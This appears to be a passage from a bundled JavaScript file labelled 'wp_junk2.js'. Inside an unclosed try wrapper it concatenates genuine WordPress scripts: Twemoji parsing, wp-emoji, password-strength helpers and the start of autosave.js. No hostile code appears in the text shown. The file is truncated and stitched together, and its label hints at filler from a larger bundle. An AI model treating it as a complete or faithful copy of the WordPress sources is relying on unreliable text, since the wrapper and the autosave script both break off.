/* >>> wp_junk2.js (46393 bytes) <<< */
(function(){
try{
var twemoji = function() {
    "use strict";
    var h = {
            base: "https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/",
            ext: ".png",
            size: "72x72",
            className: "emoji",
            convert: {
                fromCodePoint: function(d) {
                    d = "string" == typeof d ? parseInt(d, 16) : d;
                    if (d < 65536) return e(d);
                    return e(55296 + ((d -= 65536) >> 10), 56320 + (1023 & d))
                },
                toCodePoint: o
            },
            onerror: function() {
                this.parentNode && this.parentNode.replaceChild(x(this.alt, !1), this)
            },
            parse: function(d, u) {
                u && "function" != typeof u || (u = {
                    callback: u
                });
                return h.doNotParse = u.doNotParse, ("string" == typeof d ? function(d, a) {
                    return n(d, function(d) {
                        var u, f, c = d,
                            e = N(d),
                            b = a.callback(e, a);
                        if (e && b) {
                            for (f in c = "<img ".concat('class="', a.className, '" ', 'draggable="false" ', 'alt="', d, '"', ' src="', b, '"'), u = a.attributes(d, e)) u.hasOwnProperty(f) && 0 !== f.indexOf("on") && -1 === c.indexOf(" " + f + "=") && (c = c.concat(" ", f, '="', u[f].replace(t, r), '"'));
                            c = c.concat("/>")
                        }
                        return c
                    })
                } : function(d, u) {
                    var f, c, e, b, a, t, r, n, o, s, i, l = function d(u, f) {
                            var c, e, b = u.childNodes,
                                a = b.length;
                            for (; a--;) c = b[a], 3 === (e = c.nodeType) ? f.push(c) : 1 !== e || "ownerSVGElement" in c || m.test(c.nodeName.toLowerCase()) || h.doNotParse && h.doNotParse(c) || d(c, f);
                            return f
                        }(d, []),
                        p = l.length;
                    for (; p--;) {
                        for (e = !1, b = document.createDocumentFragment(), a = l[p], t = a.nodeValue, r = 0; o = g.exec(t);) {
                            if ((i = o.index) !== r && b.appendChild(x(t.slice(r, i), !0)), s = N(o = o[0]), r = i + o.length, i = u.callback(s, u), s && i) {
                                for (c in (n = new Image).onerror = u.onerror, n.setAttribute("draggable", "false"), f = u.attributes(o, s)) f.hasOwnProperty(c) && 0 !== c.indexOf("on") && !n.hasAttribute(c) && n.setAttribute(c, f[c]);
                                n.className = u.className, n.alt = o, n.src = i, e = !0, b.appendChild(n)
                            }
                            n || b.appendChild(x(o, !1)), n = null
                        }
                        e && (r < t.length && b.appendChild(x(t.slice(r), !0)), a.parentNode.replaceChild(b, a))
                    }
                    return d
                })(d, {
                    callback: u.callback || b,
                    attributes: "function" == typeof u.attributes ? u.attributes : a,
                    base: ("string" == typeof u.base ? u : h).base,
                    ext: u.ext || h.ext,
                    size: u.folder || function(d) {
                        return "number" == typeof d ? d + "x" + d : d
                    }(u.size || h.size),
                    className: u.className || h.className,
                    onerror: u.onerror || h.onerror
                })
            },
            replace: n,
            test: function(d) {
                g.lastIndex = 0;
                d = g.test(d);
                return g.lastIndex = 0, d
            }
        },
        u = {
            "&": "&amp;",
            "<": "&lt;",
            ">": "&gt;",
            "'": "&#39;",
            '"': "&quot;"
        },
        g = /(?:\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc68\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffc-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffd-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb\udffc\udffe\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffd\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c[\udffb-\udfff]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc68\ud83c[\udffb-\udffe]|\ud83d\udc69\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83d\udc69\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffc-\udfff]|\ud83e\uddd1\ud83c\udffb\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffd-\udfff]|\ud83e\uddd1\ud83c\udffc\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffd\udfff]|\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c[\udffb-\udffe]|\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c[\udffb-\udfff]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d[\udc68\udc69]|\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c[\udffc-\udfff]|\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c[\udffb\udffd-\udfff]|\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c[\udffb\udffc\udffe\udfff]|\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c[\udffb-\udffd\udfff]|\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c[\udffb-\udffe]|\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68|\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d[\udc68\udc69]|\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1|\ud83d\udc6b\ud83c[\udffb-\udfff]|\ud83d\udc6c\ud83c[\udffb-\udfff]|\ud83d\udc6d\ud83c[\udffb-\udfff]|\ud83d\udc8f\ud83c[\udffb-\udfff]|\ud83d\udc91\ud83c[\udffb-\udfff]|\ud83e\udd1d\ud83c[\udffb-\udfff]|\ud83d[\udc6b-\udc6d\udc8f\udc91]|\ud83e\udd1d)|(?:\ud83d[\udc68\udc69]|\ud83e\uddd1)(?:\ud83c[\udffb-\udfff])?\u200d(?:\u2695\ufe0f|\u2696\ufe0f|\u2708\ufe0f|\ud83c[\udf3e\udf73\udf7c\udf84\udf93\udfa4\udfa8\udfeb\udfed]|\ud83d[\udcbb\udcbc\udd27\udd2c\ude80\ude92]|\ud83e[\uddaf-\uddb3\uddbc\uddbd])|(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75]|\u26f9)((?:\ud83c[\udffb-\udfff]|\ufe0f)\u200d[\u2640\u2642]\ufe0f)|(?:\ud83c[\udfc3\udfc4\udfca]|\ud83d[\udc6e\udc70\udc71\udc73\udc77\udc81\udc82\udc86\udc87\ude45-\ude47\ude4b\ude4d\ude4e\udea3\udeb4-\udeb6]|\ud83e[\udd26\udd35\udd37-\udd39\udd3d\udd3e\uddb8\uddb9\uddcd-\uddcf\uddd4\uddd6-\udddd])(?:\ud83c[\udffb-\udfff])?\u200d[\u2640\u2642]\ufe0f|(?:\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66|\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f|\ud83c\udff3\ufe0f\u200d\ud83c\udf08|\ud83d\ude36\u200d\ud83c\udf2b\ufe0f|\u2764\ufe0f\u200d\ud83d\udd25|\u2764\ufe0f\u200d\ud83e\ude79|\ud83c\udff4\u200d\u2620\ufe0f|\ud83d\udc15\u200d\ud83e\uddba|\ud83d\udc3b\u200d\u2744\ufe0f|\ud83d\udc41\u200d\ud83d\udde8|\ud83d\udc68\u200d\ud83d[\udc66\udc67]|\ud83d\udc69\u200d\ud83d[\udc66\udc67]|\ud83d\udc6f\u200d\u2640\ufe0f|\ud83d\udc6f\u200d\u2642\ufe0f|\ud83d\ude2e\u200d\ud83d\udca8|\ud83d\ude35\u200d\ud83d\udcab|\ud83e\udd3c\u200d\u2640\ufe0f|\ud83e\udd3c\u200d\u2642\ufe0f|\ud83e\uddde\u200d\u2640\ufe0f|\ud83e\uddde\u200d\u2642\ufe0f|\ud83e\udddf\u200d\u2640\ufe0f|\ud83e\udddf\u200d\u2642\ufe0f|\ud83d\udc08\u200d\u2b1b|\ud83d\udc26\u200d\u2b1b)|[#*0-9]\ufe0f?\u20e3|(?:[\xa9\xae\u2122\u265f]\ufe0f)|(?:\ud83c[\udc04\udd70\udd71\udd7e\udd7f\ude02\ude1a\ude2f\ude37\udf21\udf24-\udf2c\udf36\udf7d\udf96\udf97\udf99-\udf9b\udf9e\udf9f\udfcd\udfce\udfd4-\udfdf\udff3\udff5\udff7]|\ud83d[\udc3f\udc41\udcfd\udd49\udd4a\udd6f\udd70\udd73\udd76-\udd79\udd87\udd8a-\udd8d\udda5\udda8\uddb1\uddb2\uddbc\uddc2-\uddc4\uddd1-\uddd3\udddc-\uddde\udde1\udde3\udde8\uddef\uddf3\uddfa\udecb\udecd-\udecf\udee0-\udee5\udee9\udef0\udef3]|[\u203c\u2049\u2139\u2194-\u2199\u21a9\u21aa\u231a\u231b\u2328\u23cf\u23ed-\u23ef\u23f1\u23f2\u23f8-\u23fa\u24c2\u25aa\u25ab\u25b6\u25c0\u25fb-\u25fe\u2600-\u2604\u260e\u2611\u2614\u2615\u2618\u2620\u2622\u2623\u2626\u262a\u262e\u262f\u2638-\u263a\u2640\u2642\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267b\u267f\u2692-\u2697\u2699\u269b\u269c\u26a0\u26a1\u26a7\u26aa\u26ab\u26b0\u26b1\u26bd\u26be\u26c4\u26c5\u26c8\u26cf\u26d1\u26d3\u26d4\u26e9\u26ea\u26f0-\u26f5\u26f8\u26fa\u26fd\u2702\u2708\u2709\u270f\u2712\u2714\u2716\u271d\u2721\u2733\u2734\u2744\u2747\u2757\u2763\u2764\u27a1\u2934\u2935\u2b05-\u2b07\u2b1b\u2b1c\u2b50\u2b55\u3030\u303d\u3297\u3299])(?:\ufe0f|(?!\ufe0e))|(?:(?:\ud83c[\udfcb\udfcc]|\ud83d[\udd74\udd75\udd90]|\ud83e\udef0|[\u261d\u26f7\u26f9\u270c\u270d])(?:\ufe0f|(?!\ufe0e))|(?:\ud83c[\udf85\udfc2-\udfc4\udfc7\udfca]|\ud83d[\udc42\udc43\udc46-\udc50\udc66-\udc69\udc6e\udc70-\udc78\udc7c\udc81-\udc83\udc85-\udc87\udcaa\udd7a\udd95\udd96\ude45-\ude47\ude4b-\ude4f\udea3\udeb4-\udeb6\udec0\udecc]|\ud83e[\udd0c\udd0f\udd18-\udd1c\udd1e\udd1f\udd26\udd30-\udd39\udd3d\udd3e\udd77\uddb5\uddb6\uddb8\uddb9\uddbb\uddcd-\uddcf\uddd1-\udddd\udec3-\udec5\udef1-\udef8]|[\u270a\u270b]))(?:\ud83c[\udffb-\udfff])?|(?:\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc73\udb40\udc63\udb40\udc74\udb40\udc7f|\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc77\udb40\udc6c\udb40\udc73\udb40\udc7f|\ud83c\udde6\ud83c[\udde8-\uddec\uddee\uddf1\uddf2\uddf4\uddf6-\uddfa\uddfc\uddfd\uddff]|\ud83c\udde7\ud83c[\udde6\udde7\udde9-\uddef\uddf1-\uddf4\uddf6-\uddf9\uddfb\uddfc\uddfe\uddff]|\ud83c\udde8\ud83c[\udde6\udde8\udde9\uddeb-\uddee\uddf0-\uddf5\uddf7\uddfa-\uddff]|\ud83c\udde9\ud83c[\uddea\uddec\uddef\uddf0\uddf2\uddf4\uddff]|\ud83c\uddea\ud83c[\udde6\udde8\uddea\uddec\udded\uddf7-\uddfa]|\ud83c\uddeb\ud83c[\uddee-\uddf0\uddf2\uddf4\uddf7]|\ud83c\uddec\ud83c[\udde6\udde7\udde9-\uddee\uddf1-\uddf3\uddf5-\uddfa\uddfc\uddfe]|\ud83c\udded\ud83c[\uddf0\uddf2\uddf3\uddf7\uddf9\uddfa]|\ud83c\uddee\ud83c[\udde8-\uddea\uddf1-\uddf4\uddf6-\uddf9]|\ud83c\uddef\ud83c[\uddea\uddf2\uddf4\uddf5]|\ud83c\uddf0\ud83c[\uddea\uddec-\uddee\uddf2\uddf3\uddf5\uddf7\uddfc\uddfe\uddff]|\ud83c\uddf1\ud83c[\udde6-\udde8\uddee\uddf0\uddf7-\uddfb\uddfe]|\ud83c\uddf2\ud83c[\udde6\udde8-\udded\uddf0-\uddff]|\ud83c\uddf3\ud83c[\udde6\udde8\uddea-\uddec\uddee\uddf1\uddf4\uddf5\uddf7\uddfa\uddff]|\ud83c\uddf4\ud83c\uddf2|\ud83c\uddf5\ud83c[\udde6\uddea-\udded\uddf0-\uddf3\uddf7-\uddf9\uddfc\uddfe]|\ud83c\uddf6\ud83c\udde6|\ud83c\uddf7\ud83c[\uddea\uddf4\uddf8\uddfa\uddfc]|\ud83c\uddf8\ud83c[\udde6-\uddea\uddec-\uddf4\uddf7-\uddf9\uddfb\uddfd-\uddff]|\ud83c\uddf9\ud83c[\udde6\udde8\udde9\uddeb-\udded\uddef-\uddf4\uddf7\uddf9\uddfb\uddfc\uddff]|\ud83c\uddfa\ud83c[\udde6\uddec\uddf2\uddf3\uddf8\uddfe\uddff]|\ud83c\uddfb\ud83c[\udde6\udde8\uddea\uddec\uddee\uddf3\uddfa]|\ud83c\uddfc\ud83c[\uddeb\uddf8]|\ud83c\uddfd\ud83c\uddf0|\ud83c\uddfe\ud83c[\uddea\uddf9]|\ud83c\uddff\ud83c[\udde6\uddf2\uddfc]|\ud83c[\udccf\udd8e\udd91-\udd9a\udde6-\uddff\ude01\ude32-\ude36\ude38-\ude3a\ude50\ude51\udf00-\udf20\udf2d-\udf35\udf37-\udf7c\udf7e-\udf84\udf86-\udf93\udfa0-\udfc1\udfc5\udfc6\udfc8\udfc9\udfcf-\udfd3\udfe0-\udff0\udff4\udff8-\udfff]|\ud83d[\udc00-\udc3e\udc40\udc44\udc45\udc51-\udc65\udc6a\udc6f\udc79-\udc7b\udc7d-\udc80\udc84\udc88-\udc8e\udc90\udc92-\udca9\udcab-\udcfc\udcff-\udd3d\udd4b-\udd4e\udd50-\udd67\udda4\uddfb-\ude44\ude48-\ude4a\ude80-\udea2\udea4-\udeb3\udeb7-\udebf\udec1-\udec5\uded0-\uded2\uded5-\uded7\udedc-\udedf\udeeb\udeec\udef4-\udefc\udfe0-\udfeb\udff0]|\ud83e[\udd0d\udd0e\udd10-\udd17\udd20-\udd25\udd27-\udd2f\udd3a\udd3c\udd3f-\udd45\udd47-\udd76\udd78-\uddb4\uddb7\uddba\uddbc-\uddcc\uddd0\uddde-\uddff\ude70-\ude7c\ude80-\ude88\ude90-\udebd\udebf-\udec2\udece-\udedb\udee0-\udee8]|[\u23e9-\u23ec\u23f0\u23f3\u267e\u26ce\u2705\u2728\u274c\u274e\u2753-\u2755\u2795-\u2797\u27b0\u27bf\ue50a])|\ufe0f/g,
        f = /\uFE0F/g,
        c = String.fromCharCode(8205),
        t = /[&<>'"]/g,
        m = /^(?:iframe|noframes|noscript|script|select|style|textarea)$/,
        e = String.fromCharCode;
    return h;

    function x(d, u) {
        return document.createTextNode(u ? d.replace(f, "") : d)
    }

    function b(d, u) {
        return "".concat(u.base, u.size, "/", d, u.ext)
    }

    function N(d) {
        return o(d.indexOf(c) < 0 ? d.replace(f, "") : d)
    }

    function r(d) {
        return u[d]
    }

    function a() {
        return null
    }

    function n(d, u) {
        return String(d).replace(g, u)
    }

    function o(d, u) {
        for (var f = [], c = 0, e = 0, b = 0; b < d.length;) c = d.charCodeAt(b++), e ? (f.push((65536 + (e - 55296 << 10) + (c - 56320)).toString(16)), e = 0) : 55296 <= c && c <= 56319 ? e = c : f.push(c.toString(16));
        return f.join(u || "-")
    }
}();
// Source: wp-includes/js/wp-emoji.min.js
! function(c, l) {
    c.wp = c.wp || {}, c.wp.emoji = new function() {
        var n, u, e = c.MutationObserver || c.WebKitMutationObserver || c.MozMutationObserver,
            a = c.document,
            t = !1,
            r = 0,
            o = 0 < c.navigator.userAgent.indexOf("Trident/7.0");

        function i() {
            return !a.implementation.hasFeature || a.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#Image", "1.1")
        }

        function s() {
            if (!t) {
                if (void 0 === c.twemoji) return 600 < r ? void 0 : (c.clearTimeout(u), u = c.setTimeout(s, 50), void r++);
                n = c.twemoji, t = !0, e && new e(function(u) {
                    for (var e, t, n, a, r = u.length; r--;) {
                        if (e = u[r].addedNodes, t = u[r].removedNodes, 1 === (n = e.length) && 1 === t.length && 3 === e[0].nodeType && "IMG" === t[0].nodeName && e[0].data === t[0].alt && "load-failed" === t[0].getAttribute("data-error")) return;
                        for (; n--;) {
                            if (3 === (a = e[n]).nodeType) {
                                if (!a.parentNode) continue;
                                if (o)
                                    for (; a.nextSibling && 3 === a.nextSibling.nodeType;) a.nodeValue = a.nodeValue + a.nextSibling.nodeValue, a.parentNode.removeChild(a.nextSibling);
                                a = a.parentNode
                            }
                            d(a.textContent) && f(a)
                        }
                    }
                }).observe(a.body, {
                    childList: !0,
                    subtree: !0
                }), f(a.body)
            }
        }

        function d(u) {
            return !!u && (/[\uDC00-\uDFFF]/.test(u) || /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/.test(u))
        }

        function f(u, e) {
            var t;
            return !l.supports.everything && n && u && ("string" == typeof u || u.childNodes && u.childNodes.length) ? (e = e || {}, t = {
                base: i() ? l.svgUrl : l.baseUrl,
                ext: i() ? l.svgExt : l.ext,
                className: e.className || "emoji",
                callback: function(u, e) {
                    switch (u) {
                        case "a9":
                        case "ae":
                        case "2122":
                        case "2194":
                        case "2660":
                        case "2663":
                        case "2665":
                        case "2666":
                            return !1
                    }
                    return !(l.supports.everythingExceptFlag && !/^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test(u) && !/^(1f3f3-fe0f-200d-1f308|1f3f4-200d-2620-fe0f)$/.test(u)) && "".concat(e.base, u, e.ext)
                },
                attributes: function() {
                    return {
                        role: "img"
                    }
                },
                onerror: function() {
                    n.parentNode && (this.setAttribute("data-error", "load-failed"), n.parentNode.replaceChild(a.createTextNode(n.alt), n))
                },
                doNotParse: function(u) {
                    return !(!u || !u.className || "string" != typeof u.className || -1 === u.className.indexOf("wp-exclude-emoji"))
                }
            }, "object" == typeof e.imgAttr && (t.attributes = function() {
                return e.imgAttr
            }), n.parse(u, t)) : u
        }
        return l && (l.DOMReady ? s() : l.readyCallback = s), {
            parse: f,
            test: d
        }
    }
}(window, window._wpemojiSettings);
window.wp = window.wp || {},
    function(a) {
        var e = wp.i18n.__,
            n = wp.i18n.sprintf;
        wp.passwordStrength = {
            meter: function(e, n, t) {
                return Array.isArray(n) || (n = [n.toString()]), e != t && t && 0 < t.length ? 5 : void 0 === window.zxcvbn ? -1 : zxcvbn(e, n).score
            },
            userInputBlacklist: function() {
                return window.console.log(n(e("%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code."), "wp.passwordStrength.userInputBlacklist()", "5.5.0", "wp.passwordStrength.userInputDisallowedList()")), wp.passwordStrength.userInputDisallowedList()
            },
            userInputDisallowedList: function() {
                var e, n, t, r, s = [],
                    i = [],
                    o = ["user_login", "first_name", "last_name", "nickname", "display_name", "email", "url", "description", "weblog_title", "admin_email"];
                for (s.push(document.title), s.push(document.URL), n = o.length, e = 0; e < n; e++) 0 !== (r = a("#" + o[e])).length && (s.push(r[0].defaultValue), s.push(r.val()));
                for (t = s.length, e = 0; e < t; e++) s[e] && (i = i.concat(s[e].replace(/\W/g, " ").split(" ")));
                return i = a.grep(i, function(e, n) {
                    return !("" === e || e.length < 4) && a.inArray(e, i) === n
                })
            }
        }, window.passwordStrength = wp.passwordStrength.meter
    }(jQuery);


/**
 * @output wp-includes/js/autosave.js
 */

/* global tinymce, wpCookies, autosaveL10n, switchEditors */
// Back-compat.
window.autosave = function() {
	return true;
};

/**
 * Adds autosave to the window object on dom ready.
 *
 * @since 3.9.0
 *
 * @param {jQuery} $ jQuery object.
 * @param {window} The window object.
 *
 */
( function( $, window ) {
	/**
	 * Auto saves the post.
	 *
	 * @since 3.9.0
	 *
	 * @return {Object}
	 * 	{{
	 * 		getPostData: getPostData,
	 * 		getCompareString: getCompareString,
	 * 		disableButtons: disableButtons,
	 * 		enableButtons: enableButtons,
	 * 		local: ({hasStorage, getSavedPostData, save, suspend, resume}|*),
	 * 		server: ({tempBlockSave, triggerSave, postChanged, suspend, resume}|*)
	 * 	}}
	 * 	The object with all functions for autosave.
	 */
	function autosave() {
		var initialCompareString,
			initialCompareData = {},
			lastTriggerSave    = 0,
			$document          = $( document );

		/**
		 * Sets the initial compare data.
		 *
		 * @since 5.6.1
		 */
		function setInitialCompare() {
			initialCompareData = {
				post_title: $( '#title' ).val() || '',
				content: $( '#content' ).val() || '',
				excerpt: $( '#excerpt' ).val() || ''
			};

			initialCompareString = getCompareString( initialCompareData );
		}

		/**
